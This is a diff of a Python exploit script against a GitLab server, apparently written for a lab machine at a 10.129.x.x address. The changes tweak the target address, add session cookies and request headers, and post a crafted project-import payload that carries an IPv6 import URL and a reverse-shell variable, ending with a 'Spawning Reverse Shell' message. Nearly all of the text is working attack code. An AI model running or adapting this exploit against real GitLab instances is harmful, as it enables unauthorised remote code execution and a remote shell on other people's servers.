@@ -38,7 +38,7 @@ lport = args.p
 #Retrieve CSRF Token
 
 warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
-gitlab_url = "http://10.129.49.62:5080"
+gitlab_url = "http://10.129.49.56:5080"
 request = requests.Session()
 print("[+] Retrieving CSRF token to submit the login form")
 time.sleep(1)
@@ -191,9 +191,9 @@ elif (http_server=="Y") or (http_server=="y"):
 
 
 
-		#response = request.post('http://10.129.49.31:5080/projects',data=payload,cookies=cookies,headers=headers,verify=False)
+		#response = request.post('http://10.129.49.31:5080/projects',data=payload,proxies=proxies,cookies=cookies,headers=headers,verify=False)
 
-		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,proxies=proxies,headers=headers,verify=False)
+		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,headers=headers,verify=False)
 		print("[+] Success!")
 		time.sleep(1)
 		print("[+] Run Exploit with Option 2")
@@ -222,6 +222,44 @@ elif (http_server=="Y") or (http_server=="y"):
 
 		payload=b"utf8=%E2%9C%93&authenticity_token={}&project%5Bimport_url%5D={}{}&project%5Bci_cd_only%5D=false&project%5Bname%5D={}&project%5Bnamespace_id%5D={}&project%5Bpath%5D={}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0".format(urlencoded_token_final,ipv6_url,reverse_shell,project_name,namespace_id,project_name)
 
+
+
+
+
+
+		proxies = {
+			"http" : "http://127.0.0.1:8080",
+		     	"https" : "https://127.0.0.1:8080",
+			    }
+			    
+		cookies = {
+		    'sidebar_collapsed': 'false',
+		    'event_filter': 'all',
+		    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
+		    '_gitlab_session':request.cookies['_gitlab_session'],
+		}
+
+		headers = {
+		    'Host': '10.129.49.31:5080',
+		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+		    'Accept-Language': 'en-US,en;q=0.5',
+		    'Accept-Encoding': 'gzip, deflate',
+		    'Referer': 'http://10.129.49.31:5080/projects',
+		    'Content-Type': 'application/x-www-form-urlencoded',
+		    'Content-Length': '398',
+		    'Connection': 'close',
+		    'Upgrade-Insecure-Requests': '1',
+		}
+
+
+
+		#response = request.post('http://10.129.49.31:5080/projects',data=payload,proxies=proxies,cookies=cookies,headers=headers,verify=False)
+
+		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,headers=headers,verify=False)
+		print("[+] Success!")
+		time.sleep(1)
+		print("[+] Spawning Reverse Shell")
 
 
 
